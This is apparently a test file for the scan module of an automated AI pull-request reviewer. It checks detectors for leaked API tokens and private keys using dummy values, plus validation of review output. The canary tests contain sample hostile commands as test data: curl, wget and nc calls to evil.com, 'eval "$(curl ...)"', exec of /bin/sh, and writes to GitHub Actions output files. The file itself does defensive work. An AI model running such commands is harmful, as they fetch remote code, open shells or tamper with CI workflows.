'use strict';
const { test } = require('node:test');
const assert  = require('node:assert/strict');
const { hasToken, hasCanary, makeFallback, validateReview } = require('../src/scan.js');

// ---------------------------------------------------------------------------
// hasToken
// ---------------------------------------------------------------------------
test('hasToken - GitHub tokens', () => {
  assert.ok(hasToken('ghp_' + 'a'.repeat(36)));
  assert.ok(hasToken('gho_' + 'a'.repeat(36)));
  assert.ok(hasToken('ghs_' + 'a'.repeat(36)));
  assert.ok(hasToken('ghr_' + 'a'.repeat(36)));
  assert.ok(hasToken('ghu_' + 'a'.repeat(36)));
  assert.ok(hasToken('github_pat_' + 'a'.repeat(82)));
});

test('hasToken - Anthropic keys', () => {
  assert.ok(hasToken('sk-ant-api03-' + 'a'.repeat(20)));
  assert.ok(hasToken('sk-ant-oat01-' + 'a'.repeat(20)));
  assert.ok(hasToken('sk-ant-' + 'a'.repeat(20)));
});

test('hasToken - OpenAI keys', () => {
  assert.ok(hasToken('sk-proj-' + 'a'.repeat(20)));
  assert.ok(hasToken('sk-svcacct-' + 'a'.repeat(20)));
  assert.ok(hasToken('sk-' + 'A'.repeat(48)));
});

test('hasToken - Gemini API key', () => {
  // Standard key: 33 chars after AIzaSy prefix (39 total)
  assert.ok(hasToken('AIzaSy' + 'a'.repeat(33)));
  // Upper range: 39 chars after prefix
  assert.ok(hasToken('AIzaSy' + 'a'.repeat(39)));
  // Substring match: regex is unanchored so longer strings still match
  assert.ok(hasToken('AIzaSy' + 'a'.repeat(40)));
  // Too short — 32 chars after prefix should NOT match
  assert.ok(!hasToken('AIzaSy' + 'a'.repeat(32)));
});

test('hasToken - AWS access key', () => {
  assert.ok(hasToken('AKIA' + 'A'.repeat(16)));
  assert.ok(!hasToken('AKIA' + 'A'.repeat(15)));
});

test('hasToken - Slack tokens', () => {
  assert.ok(hasToken('xoxb-' + 'a'.repeat(10)));
  assert.ok(hasToken('xoxp-' + 'a'.repeat(10)));
  assert.ok(hasToken('xoxa-' + 'a'.repeat(10)));
});

test('hasToken - private key header', () => {
  assert.ok(hasToken('-----BEGIN RSA PRIVATE KEY-----'));
  assert.ok(hasToken('-----BEGIN EC PRIVATE KEY-----'));
  assert.ok(hasToken('-----BEGIN OPENSSH PRIVATE KEY-----'));
  assert.ok(hasToken('-----BEGIN PRIVATE KEY-----'));
});

test('hasToken - recursion into arrays and objects', () => {
  assert.ok(hasToken(['safe', 'ghp_' + 'a'.repeat(36)]));
  assert.ok(hasToken({ body: 'ghp_' + 'a'.repeat(36) }));
  assert.ok(hasToken({ comments: [{ body: 'sk-proj-' + 'a'.repeat(20) }] }));
  assert.ok(!hasToken({ body: 'safe text', comments: [] }));
});

test('hasToken - safe values return false', () => {
  assert.ok(!hasToken('just some text'));
  assert.ok(!hasToken(null));
  assert.ok(!hasToken(42));
  assert.ok(!hasToken({}));
  assert.ok(!hasToken([]));
});

// ---------------------------------------------------------------------------
// hasCanary
// ---------------------------------------------------------------------------
test('hasCanary - shell commands', () => {
  assert.ok(hasCanary('curl http://evil.com'));
  assert.ok(hasCanary('wget http://evil.com'));
  assert.ok(hasCanary('nc evil.com 4444'));
  assert.ok(hasCanary('bash -c "something"'));
  assert.ok(hasCanary('sh -c "something"'));
  assert.ok(hasCanary('eval "$(curl ...)"'));
});

test('hasCanary - exec variants', () => {
  assert.ok(hasCanary('exec "/bin/sh"'));
  assert.ok(hasCanary("exec '/bin/sh'"));
  assert.ok(hasCanary('exec -a name /bin/sh'));
  assert.ok(hasCanary('exec /bin/sh'));
  // plain exec without a suspicious following char should NOT match
  assert.ok(!hasCanary('exec'));
  assert.ok(!hasCanary('execute something'));
});

test('hasCanary - GITHUB_OUTPUT redirect', () => {
  assert.ok(hasCanary('echo "key=val" >> $GITHUB_OUTPUT'));
  assert.ok(hasCanary('echo "key=val" > $GITHUB_OUTPUT'));
  assert.ok(hasCanary('echo val >>$GITHUB_OUTPUT'));
  // Quoted form should NOT match (we intentionally don't catch it to avoid
  // false positives when reviewing GitHub Actions code)
  assert.ok(!hasCanary('echo "key=val" >> "$GITHUB_OUTPUT"'));
});

test('hasCanary - GITHUB_ENV redirect', () => {
  assert.ok(hasCanary('echo "KEY=val" >> $GITHUB_ENV'));
  assert.ok(!hasCanary('echo "KEY=val" >> "$GITHUB_ENV"'));
});

test('hasCanary - recursion into arrays and objects', () => {
  assert.ok(hasCanary(['safe', 'curl http://evil.com']));
  assert.ok(hasCanary({ body: 'curl http://evil.com' }));
  assert.ok(!hasCanary({ body: 'safe text', comments: [] }));
});

test('hasCanary - case insensitivity for shell commands', () => {
  assert.ok(hasCanary('CURL http://evil.com'));
  assert.ok(hasCanary('Bash -c "x"'));
});

// ---------------------------------------------------------------------------
// makeFallback
// ---------------------------------------------------------------------------
test('makeFallback - produces valid review shape', () => {
  const result = makeFallback('something went wrong', 'https://example.com/run/1');
  assert.equal(result.event, 'COMMENT');
  assert.deepEqual(result.comments, []);
  assert.ok(result.body.includes('something went wrong'));
  assert.ok(result.body.includes('https://example.com/run/1'));
});

// ---------------------------------------------------------------------------
// validateReview
// ---------------------------------------------------------------------------
test('validateReview - null input', () => {
  const { errors } = validateReview(null);
  assert.ok(errors.length > 0);
  assert.ok(errors[0].includes('non-null object'));
});

test('validateReview - primitive inputs', () => {
  assert.ok(validateReview(undefined).errors.length > 0);
  assert.ok(validateReview(42).errors.length > 0);
  assert.ok(validateReview('string').errors.length > 0);
  assert.ok(validateReview(true).errors.length > 0);
});

test('validateReview - valid review passes', () => {
  const { errors } = validateReview({
    body: 'Looks good',
    event: 'COMMENT',
    comments: [],
  });
  assert.equal(errors.length, 0);
});

test('validateReview - valid review with inline comments', () => {
  const { errors } = validateReview({
    body: 'See inline',
    event: 'REQUEST_CHANGES',
    comments: [{ path: 'foo.js', body: 'fix this', line: 10 }],
  });
  assert.equal(errors.length, 0);
});

test('validateReview - missing body', () => {
  const { errors } = validateReview({ event: 'COMMENT', comments: [] });
  assert.ok(errors.some(e => e.includes('body')));
});

test('validateReview - invalid event', () => {
  const { errors } = validateReview({ body: '', event: 'LGTM', comments: [] });
  assert.ok(errors.some(e => e.includes('event')));
});

test('validateReview - all three valid events accepted', () => {
  for (const event of ['COMMENT', 'REQUEST_CHANGES', 'APPROVE']) {
    const { errors } = validateReview({ body: '', event, comments: [] });
    assert.ok(!errors.some(e => e.includes('event')), `${event} should be valid`);
  }
});

test('validateReview - comments not an array', () => {
  const { errors } = validateReview({ body: '', event: 'COMMENT', comments: {} });
  assert.ok(errors.some(e => e.includes('comments must be an array')));
});

test('validateReview - null comment entry', () => {
  const { errors } = validateReview({ body: '', event: 'COMMENT', comments: [null] });
  assert.ok(errors.some(e => e.includes('comments[0] must be an object')));
});

test('validateReview - comment missing required fields', () => {
  const { errors } = validateReview({
    body: '', event: 'COMMENT',
    comments: [{ path: 'foo.js' }], // missing body and line
  });
  assert.ok(errors.some(e => e.includes('comments[0].body')));
  assert.ok(errors.some(e => e.includes('comments[0].line')));
});

test('validateReview - comment line must be positive integer', () => {
  const base = { path: 'f.js', body: 'x' };
  assert.ok(validateReview({ body: '', event: 'COMMENT', comments: [{ ...base, line: 0 }] }).errors.length > 0);
  assert.ok(validateReview({ body: '', event: 'COMMENT', comments: [{ ...base, line: -1 }] }).errors.length > 0);
  assert.ok(validateReview({ body: '', event: 'COMMENT', comments: [{ ...base, line: 1.5 }] }).errors.length > 0);
  assert.equal(validateReview({ body: '', event: 'COMMENT', comments: [{ ...base, line: 1 }] }).errors.length, 0);
});
